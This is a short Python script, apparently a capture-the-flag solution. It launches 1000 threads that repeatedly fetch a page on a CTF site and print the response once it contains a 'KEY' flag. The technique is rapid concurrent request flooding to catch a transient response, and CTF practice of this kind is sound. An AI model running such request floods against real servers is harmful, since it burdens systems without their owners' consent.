import threading
import requests as r
import os
import time
import time

URL = 'http://ctf.slothparadise.com/about.php'

lock = threading.Lock()

class myThread(threading.Thread):
    def __init__(self, ID, name, count):
        threading.Thread.__init__(self)
        self.threadID = ID
        self.name = name
        self.counter = count

    def run(self):
        lock.acquire()
        get = r.get(URL)
        lock.release()
        #print(str(self.threadID) + ' Reloads')
        if 'KEY' in get.text:
            print(get.text)
            os._exit(1)
        
threads = list()
for i in range(1000):
    thread = myThread(i, "Thread " + str(i), i)
    threads.append(thread)
    thread.start()

for t in threads:
    t.join()